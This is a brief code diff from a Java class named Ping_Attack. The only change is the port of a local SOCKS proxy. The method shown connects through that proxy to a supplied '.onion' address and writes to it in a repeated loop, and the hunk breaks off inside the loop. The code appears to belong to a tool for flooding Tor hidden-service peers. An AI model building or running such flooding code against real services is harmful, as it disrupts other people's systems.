@@ -16,7 +16,7 @@ public class Ping_Attack extends Thread  {
 public static void attack(String id, int count)
 {
     try {
-        Socket sock = new Socket(new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 11599)));
+        Socket sock = new Socket(new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 11233)));
 		sock.connect(InetSocketAddress.createUnresolved(id + ".onion", 11009));
         OutputStream os = sock.getOutputStream();
         for(int f=0;f<count;f++)
